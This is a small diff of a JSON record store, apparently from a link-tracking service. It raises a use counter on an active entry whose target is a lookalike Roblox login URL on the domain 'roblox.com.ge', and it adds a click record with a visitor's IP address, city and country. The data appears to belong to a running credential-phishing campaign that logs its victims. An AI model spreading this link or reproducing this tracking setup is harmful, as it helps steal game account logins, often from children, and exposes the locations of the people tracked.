@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1672,
+    "useCount": 1673,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13544,6 +13544,14 @@
         "city": "Gijang-gun",
         "flag": "🇰🇷",
         "countryCode": "KR"
+      },
+      {
+        "timestamp": 1777619467808,
+        "ip": "49.149.106.137",
+        "country": "Philippines",
+        "city": "Zamboanga City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
